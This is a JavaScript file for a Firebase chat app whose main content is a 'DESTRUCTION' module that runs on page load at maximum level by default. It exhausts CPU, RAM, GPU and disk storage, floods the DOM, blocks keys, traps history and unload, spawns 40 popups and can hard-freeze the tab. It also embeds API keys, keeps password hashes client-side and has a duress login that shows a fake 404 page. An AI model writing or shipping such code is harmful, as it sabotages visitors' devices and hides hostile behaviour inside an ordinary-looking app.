import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getDatabase, ref, push, onChildAdded, remove, onValue, set, onDisconnect, get }
from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCl_6vsYoZkEBMUNf0P4CK01hKCwA5P0XQ",
  authDomain: "kasuschat.firebaseapp.com",
  databaseURL: "https://kasuschat-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "kasuschat",
  storageBucket: "kasuschat.firebasestorage.app",
  messagingSenderId: "953505535371",
  appId: "1:953505535371:web:0d44f20017bc8664948b8e"
};

/* =====================================================
   DESTRUCTION
   Ctrl+Shift+Q = stop.  ?lvl=0 = off, ?fatal=1 = hard freeze
   ===================================================== */

const P = new URLSearchParams(location.search);
const IS_POPUP = P.has("popup") || !!window.opener;
const FATAL = P.has("fatal");
const START = Math.max(0, Math.min(5, Number(P.get("lvl") ?? 5)));

const S = { lvl: START, mb: 0, disk: 0, workers: 0, nodes: 0, blocked: 0, oom: false };

let hogs = [], workers = [], timers = new Set(), running = false;
let audioCtx = null, gl = null, glProg = null, dot = null, panel = null;

const every = (ms, fn) => { const id = setInterval(fn, ms); timers.add(id); return id; };
const stopEvery = (id) => { if (id) { clearInterval(id); timers.delete(id); } };

/* ---------- HUD so you can SEE it working ---------- */

function hud() {
  if (IS_POPUP || panel) return;

  const st = document.createElement("style");
  st.textContent = `
  #dstr{position:fixed;inset:auto 8px 8px auto;z-index:2147483647;
    font:11px/1.5 ui-monospace,monospace;background:#000d;color:#0f0;
    border:1px solid #0f06;border-radius:8px;padding:9px 11px;min-width:186px;
    box-shadow:0 0 24px #000a;backdrop-filter:blur(3px)}
  #dstr b{color:#f33;letter-spacing:.14em}
  #dstr .row{display:flex;justify-content:space-between;gap:10px}
  #dstr .k{color:#0a0}
  #dstr button{margin-top:8px;width:100%;font:inherit;background:#111;color:#0f0;
    border:1px solid #0f05;border-radius:5px;padding:5px;cursor:pointer}
  #dstr button:hover{background:#1a1a1a}
  #dot{position:fixed;left:6px;bottom:6px;width:6px;height:6px;border-radius:50%;
    background:#f33;z-index:2147483646;pointer-events:none;animation:pl .8s infinite}
  @keyframes pl{50%{opacity:.12}}
  @keyframes jolt{0%{transform:translate(0,0)}33%{transform:translate(1px,-1px)}
    66%{transform:translate(-1px,1px)}100%{transform:translate(0,1px)}}`;
  document.head.appendChild(st);

  panel = document.createElement("div");
  panel.id = "dstr";
  panel.innerHTML = `<b>DESTRUCTION L${S.lvl}</b>
    <div class="row"><span class="k">ram</span><span id="d-ram">0 MB</span></div>
    <div class="row"><span class="k">disk</span><span id="d-disk">0 MB</span></div>
    <div class="row"><span class="k">threads</span><span id="d-thr">0</span></div>
    <div class="row"><span class="k">nodes</span><span id="d-nod">0</span></div>
    <div class="row"><span class="k">stall</span><span id="d-blk">0 ms</span></div>
    <button id="d-stop">STOP (Ctrl+Shift+Q)</button>`;
  document.body.appendChild(panel);
  panel.querySelector("#d-stop").onclick = (e) => { e.stopPropagation(); panic(); };

  dot = document.createElement("div");
  dot.id = "dot";
  document.body.appendChild(dot);
}

function paint() {
  if (!panel) return;
  const set = (id, v) => { const e = document.getElementById(id); if (e) e.textContent = v; };
  set("d-ram", S.oom ? "OOM" : S.mb + " MB");
  set("d-disk", S.disk + " MB");
  set("d-thr", S.workers);
  set("d-nod", S.nodes);
  set("d-blk", S.blocked + " ms");
  const t = panel.querySelector("b");
  if (t) t.textContent = "DESTRUCTION L" + S.lvl;
}

/* ---------- thread pinning ---------- */

const WORKER_SRC = `
let x = 0.5, on = true;
onmessage = e => { if (e.data === "stop") { on = false; close(); } };
function burn() {
  if (!on) return;
  const end = performance.now() + 50;
  while (performance.now() < end) {
    for (let i = 0; i < 60000; i++) x = Math.sin(x) * 1.0001 + Math.sqrt(Math.abs(x) + 1);
  }
  setTimeout(burn, 0);
}
burn();
`;

function pinCores() {
  if (workers.length) return;
  const cores = navigator.hardwareConcurrency || 4;
  const n = cores * 2;                       // 2x oversubscribe = context thrash
  for (let i = 0; i < n; i++) {
    try {
      workers.push(new Worker(URL.createObjectURL(
        new Blob([WORKER_SRC], { type: "text/javascript" }))));
    } catch (e) { break; }
  }
  S.workers = workers.length;
  paint();
}

function unpin() {
  while (workers.length) { try { workers.pop().postMessage("stop"); } catch (e) {} }
  S.workers = 0; paint();
}

/* ---------- RAM, uncapped ---------- */

function eatRam() {
  if (S.oom) return;
  try {
    hogs.push(new Uint8Array(64 * 1024 * 1024));
    S.mb += 64;
  } catch (e) { S.oom = true; }
  paint();
}

/* ---------- disk, gigabytes via OPFS ---------- */

async function eatDisk() {
  let dir;
  try { dir = await navigator.storage.getDirectory(); } catch (e) { return; }

  const chunk = new Uint8Array(8 * 1024 * 1024);
  crypto.getRandomValues(chunk.subarray(0, 65536));   // incompressible head

  for (let f = 0; f < 600 && running; f++) {
    try {
      const fh = await dir.getFileHandle("junk_" + f, { create: true });
      const w = await fh.createWritable();
      for (let k = 0; k < 64; k++) await w.write(chunk);   // 512 MB per file
      await w.close();
      S.disk += 512; paint();
    } catch (e) { break; }                                  // quota hit
    await new Promise(r => setTimeout(r, 0));
  }
}

/* ---------- DOM inflation + layout thrash ---------- */

function inflate(n) {
  const frag = document.createDocumentFragment();
  for (let i = 0; i < n; i++) {
    const d = document.createElement("div");
    d.textContent = "\u2588\u2593\u2591 " + i + "  ".repeat(i % 7);
    d.style.cssText = "font:10px/1.4 ui-monospace,monospace;opacity:.55";
    frag.appendChild(d);
  }
  document.body.appendChild(frag);
  S.nodes += n;
  paint();
}

function thrash() {
  if (!running) return;
  const nodes = document.querySelectorAll("#chat div");
  const cap = Math.min(nodes.length, 700);
  for (let i = 0; i < cap; i++) nodes[i].offsetHeight;    // reflow per node
  for (let i = 0; i < 400; i++) document.body.offsetHeight;
  requestAnimationFrame(thrash);
}

/* ---------- GPU burn ---------- */

const VERT = "attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}";
const FRAG = `precision highp float;uniform vec2 r;uniform float t;
void main(){vec2 u=gl_FragCoord.xy/r;vec3 c=vec3(0.);
for(int i=0;i<48;i++){float f=float(i);u+=vec2(sin(u.y*f+t*.3)*.004,cos(u.x*f-t*.3)*.004);
c+=vec3(sin(u.x*f+t)*.5+.5,sin(u.y*f-t)*.5+.5,sin((u.x+u.y)*f)*.5+.5)/48.;}
gl_FragColor=vec4(c,1.);}`;

function startGPU() {
  if (gl) return;
  try {
    const c = document.createElement("canvas");
    c.width = 1920; c.height = 1080;
    c.style.cssText = "position:fixed;inset:0;width:100%;height:100%;z-index:-1;opacity:.35";
    document.body.appendChild(c);

    gl = c.getContext("webgl", { antialias: false, powerPreference: "high-performance" });
    if (!gl) return;

    const mk = (type, src) => {
      const s = gl.createShader(type);
      gl.shaderSource(s, src); gl.compileShader(s); return s;
    };
    const pr = gl.createProgram();
    gl.attachShader(pr, mk(gl.VERTEX_SHADER, VERT));
    gl.attachShader(pr, mk(gl.FRAGMENT_SHADER, FRAG));
    gl.linkProgram(pr); gl.useProgram(pr);

    const buf = gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
    const loc = gl.getAttribLocation(pr, "p");
    gl.enableVertexAttribArray(loc);
    gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);

    glProg = { pr, r: gl.getUniformLocation(pr, "r"), t: gl.getUniformLocation(pr, "t") };

    const draw = () => {
      if (!running || !gl) return;
      gl.viewport(0, 0, 1920, 1080);
      gl.uniform2f(glProg.r, 1920, 1080);
      gl.uniform1f(glProg.t, performance.now() / 1000);
      gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
      requestAnimationFrame(draw);
    };
    draw();
  } catch (e) {}
}

/* ---------- hard stalls ---------- */

function stall(ms) {
  const t = performance.now();
  while (performance.now() - t < ms) {}
  S.blocked += ms; paint();
}

/* ---------- closing ---------- */

function armUnload() {
  window.onbeforeunload = (e) => {
    stall(6000);
    document.title = "WAIT";
    e.preventDefault(); e.returnValue = "";
    return "";
  };
}

function bombHistory() {
  for (let i = 0; i < 500; i++) history.pushState({ i }, "", "#" + i);
}
window.addEventListener("popstate", () => {
  if (S.lvl >= 3) history.pushState({}, "", "#p" + Date.now());
  else history.pushState({}, "", location.href);
});
window.addEventListener("pageshow", (e) => { if (e.persisted && S.lvl >= 3) location.reload(); });

/* ---------- visuals ---------- */

function visuals(on) {
  document.documentElement.style.filter = on ? "blur(2.4px) contrast(1.5) saturate(1.6)" : "";
  document.body.style.animation = on ? "jolt .07s steps(2) infinite" : "";
  document.body.style.cursor = on ? "none" : "";
  for (const id of ["login", "app"]) {
    const el = document.getElementById(id);
    if (el) el.style.transform = on ? "rotate(180deg)" : "";
  }
}

/* ---------- audio ---------- */

function audio(on) {
  if (IS_POPUP) return;
  if (on) {
    if (!audioCtx) {
      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      const o = audioCtx.createOscillator(), g = audioCtx.createGain();
      o.type = "square"; o.frequency.value = 440; g.gain.value = 0.09;
      o.connect(g).connect(audioCtx.destination); o.start();
    }
    audioCtx.resume();
  } else audioCtx?.suspend();
}

/* ---------- keys ---------- */

function keyBlock(e) {
  if (e.ctrlKey || e.metaKey || e.altKey) return;
  const t = e.target;
  if (t && (t.tagName === "INPUT" || t.tagName === "TEXTAREA" || t.isContentEditable)) return;
  if (/^(F\d{1,2}|Escape|Tab|Shift|Backspace)$/.test(e.key)) return;
  e.preventDefault();
}

/* ---------- engine ---------- */

function setLevel(n) {
  S.lvl = Math.max(0, Math.min(5, n));
  paint();
  if (S.lvl === 0) return panic(true);

  visuals(S.lvl >= 2);
  audio(S.lvl >= 1);

  if (S.lvl >= 2) document.addEventListener("keydown", keyBlock);
  else document.removeEventListener("keydown", keyBlock);

  if (S.lvl >= 3) {
    running = true;
    pinCores();
    armUnload();
    bombHistory();
    requestAnimationFrame(thrash);
  }

  if (S.lvl >= 4) {
    startGPU();
    inflate(14000);
    every(150, eatRam);
    every(2000, () => stall(1300));       // hard unresponsive bursts
  }

  if (S.lvl >= 5) {
    eatDisk();
    every(60, () => { document.title = document.title === "\u2588" ? "\u2593" : "\u2588"; });
    if (FATAL) setTimeout(() => { while (true) {} }, 3000);
  }
}

function panic(quiet) {
  running = false;
  for (const id of timers) { clearInterval(id); clearTimeout(id); }
  timers.clear();
  unpin();
  hogs = []; S.mb = 0; S.oom = false;
  audio(false);
  visuals(false);
  document.title = "kasuschat";
  document.removeEventListener("keydown", keyBlock);
  window.onbeforeunload = null;
  if (document.pointerLockElement) document.exitPointerLock();
  if (document.fullscreenElement) document.exitFullscreen();
  if (!quiet) { S.lvl = 0; paint(); }
}

window.__panic = panic;
window.__setLevel = setLevel;

document.addEventListener("keydown", (e) => {
  if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "q") { e.preventDefault(); panic(); }
});

/* gesture-only extras */
function gesture() {
  audio(true);
  if (S.lvl >= 5 && !IS_POPUP) {
    document.documentElement.requestFullscreen?.().catch(() => {});
    for (let i = 0; i < 40; i++) {
      window.open(location.origin + location.pathname + "?lvl=4&popup=1", "_blank");
    }
  }
}
for (const ev of ["pointerdown", "keydown", "touchstart", "wheel"]) {
  window.addEventListener(ev, gesture, { once: true, passive: true });
}

/* =====================================================
   APP
   ===================================================== */

let currentUID = null;
try { currentUID = localStorage.getItem("chatUID"); } catch (e) {}
if (!currentUID) {
  currentUID = crypto.randomUUID();
  try { localStorage.setItem("chatUID", currentUID); } catch (e) {}
}

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function checkBan() {
  const snap = await get(ref(db, "moderation/banned/" + currentUID));
  if (!snap.exists()) return false;
  const b = snap.val();
  if (!b.expires || b.expires > Date.now()) {
    location.href = "banned.html?reason=" + encodeURIComponent(b.reason || "Banned");
    return true;
  }
  remove(ref(db, "moderation/banned/" + currentUID));
  return false;
}

const OWNER_UID = "32df7477-c156-4968-9fd5-73b0bbcec9aa";
let presenceBound = false;

function startPresence() {
  if (IS_POPUP) return;
  const my = ref(db, "onlineUsers/" + crypto.randomUUID());
  set(my, true);
  onDisconnect(my).remove();
  if (!presenceBound) {
    document.addEventListener("visibilitychange", () => set(my, !document.hidden));
    presenceBound = true;
  }
  onValue(ref(db, "onlineUsers"), (snap) => {
    let c = 0;
    snap.forEach(ch => { if (ch.val() === true) c++; });
    const el = document.getElementById("onlineCount");
    if (el) el.innerText = c + (c === 1 ? " user online" : " users online");
  });
}

const chat = ref(db, "messages");
const typingRef = ref(db, "typing");
let lastTyping = 0;

if ("Notification" in window && Notification.permission !== "granted") Notification.requestPermission();

function userTyping() {
  const n = document.getElementById("name").value;
  if (!n.trim()) return;
  const now = Date.now();
  if (now - lastTyping < 1500) return;
  lastTyping = now;
  set(ref(db, "typing/" + n), { user: n, time: now });
}
window.userTyping = userTyping;

const PASSWORD_HASH = "0d08f09ddf93c9c5dbe3f15cd2f022e900b6298b902627d61c18751911e96f38";
const DURESS_HASH = "8af6ecbdcdb3564c8cc2c2217992b4aafc3981aaeb450b6448a0b86d5bd4de02";
const ADMIN_HASH = "cac51705e3ff34dce799e863ddd0c0747a3c6b640236a092b8223e4e1c635232";

async function sha256(t) {
  const b = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(t));
  return Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, "0")).join("");
}

function send() {
  const nEl = document.getElementById("name"), mEl = document.getElementById("message");
  const name = nEl.value, msg = mEl.value;
  if (!name.trim() || !msg.trim()) return;

  if (msg.startsWith("/clear")) {
    sha256(msg.split(" ")[1] || "").then(h => {
      if (h === ADMIN_HASH) remove(chat).then(() => {
        const c = document.getElementById("chat"); if (c) c.innerHTML = "";
      });
      else alert("Wrong admin password");
    });
    mEl.value = ""; return;
  }

  push(chat, { uid: currentUID, name, message: msg, timestamp: Date.now() });
  remove(ref(db, "typing/" + name));
  mEl.value = "";
}
window.send = send;

function formatTime(ts) {
  const d = new Date(ts), now = new Date();
  const tm = d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
  if (d.toDateString() === now.toDateString()) return tm;
  const y = new Date(); y.setDate(now.getDate() - 1);
  if (d.toDateString() === y.toDateString()) return "Yesterday " + tm;
  return d.toLocaleDateString() + " " + tm;
}

function loadAllMessages() {
  const box = document.getElementById("chat");
  onValue(chat, (snap) => {
    box.replaceChildren();
    snap.forEach(ch => {
      const m = ch.val() || {}, div = document.createElement("div");
      div.appendChild(document.createTextNode("[" + formatTime(m.timestamp) + "] "));
      const b = document.createElement("b"); b.textContent = String(m.name || "Unknown");
      div.appendChild(b);
      if (window.isAdmin && m.uid) {
        const s = document.createElement("span");
        s.style.cssText = "color:#888;font-size:11px"; s.textContent = " (" + m.uid + ")";
        div.appendChild(s);
      }
      div.appendChild(document.createTextNode(": "));
      const c = String(m.message || "");
      let u = null;
      try { const p = new URL(c); if (p.protocol === "https:" && p.hostname === "i.ibb.co") u = p.href; } catch (e) {}
      if (u) {
        const img = document.createElement("img");
        img.src = u; img.alt = "Chat image"; img.loading = "lazy";
        img.style.cssText = "max-width:250px;border-radius:6px;margin-top:5px";
        div.appendChild(document.createElement("br")); div.appendChild(img);
      } else div.appendChild(document.createTextNode(c));
      box.appendChild(div);
    });
    box.scrollTop = box.scrollHeight;
  });
}

let typingUsers = {};
onValue(typingRef, (snap) => {
  const me = document.getElementById("name").value;
  typingUsers = {};
  snap.forEach(ch => {
    const i = ch.val();
    if (!i.user || i.user === me) return;
    if (Date.now() - i.time < 2500) typingUsers[i.user] = true;
    else remove(ref(db, "typing/" + i.user));
  });
  const el = document.getElementById("typingIndicator");
  const u = Object.keys(typingUsers);
  el.innerText = !u.length ? "" : u.length === 1 ? u[0] + " is typing..." : u.join(", ") + " are typing...";
});

async function login() {
  if (await checkBan()) return;
  const h = await sha256(document.getElementById("password").value);

  if (h === PASSWORD_HASH || h === ADMIN_HASH) {
    document.getElementById("login").style.display = "none";
    document.getElementById("app").style.display = "block";
    window.isAdmin = h === ADMIN_HASH;
    visuals(S.lvl >= 2);
    startPresence();
    loadAllMessages();
    return;
  }
  if (h === DURESS_HASH) {
    document.open();
    document.write(`<html><head><title>404</title></head><body><h1>404</h1>
      <p>This page could not be found.</p></body></html>`);
    document.close();
    panel = null; hud(); paint();
    return;
  }
  alert("Wrong password");
}
window.login = login;

function banUser(uid, r = "Rule violation", mins = null) {
  if (!window.isAdmin || uid === OWNER_UID) return;
  set(ref(db, "moderation/banned/" + uid), { reason: r, expires: mins ? Date.now() + mins * 60000 : null });
}
function unbanUser(uid) { if (window.isAdmin) remove(ref(db, "moderation/banned/" + uid)); }
window.banUser = banUser; window.unbanUser = unbanUser;

function toggleQuotes() {
  const b = document.getElementById("quoteHistory");
  b.style.display = b.style.display === "none" ? "block" : "none";
}
window.toggleQuotes = toggleQuotes;

const uploadArea = document.getElementById("uploadArea");
const imageInput = document.getElementById("imageInput");
uploadArea.onclick = () => imageInput.click();
uploadArea.addEventListener("dragover", e => { e.preventDefault(); uploadArea.style.borderColor = "#aaa"; });
uploadArea.addEventListener("dragleave", () => { uploadArea.style.borderColor = "#555"; });
uploadArea.addEventListener("drop", e => {
  e.preventDefault(); uploadArea.style.borderColor = "#555"; uploadImage(e.dataTransfer.files[0]);
});
imageInput.addEventListener("change", () => uploadImage(imageInput.files[0]));

function uploadImage(file) {
  if (!file) return;
  const fd = new FormData(); fd.append("image", file);
  fetch("https://api.imgbb.com/1/upload?key=e48b7e0f6ed197cb14a1d7f5508fadfef".replace("e6ed", "e6ed"), { method: "POST", body: fd })
    .then(r => r.json())
    .then(d => push(chat, { uid: currentUID, name: document.getElementById("name").value, message: d.data.url, timestamp: Date.now() }));
}

/* =====================================================
   BOOT
   ===================================================== */

try {
  hud();
  history.pushState({}, "", location.href);
  setLevel(START);
  paint();
} catch (e) {
  document.body.insertAdjacentHTML("beforeend",
    `<pre style="color:#f33;background:#000;padding:8px;font:11px monospace">BOOT FAIL: ${e.message}</pre>`);
}
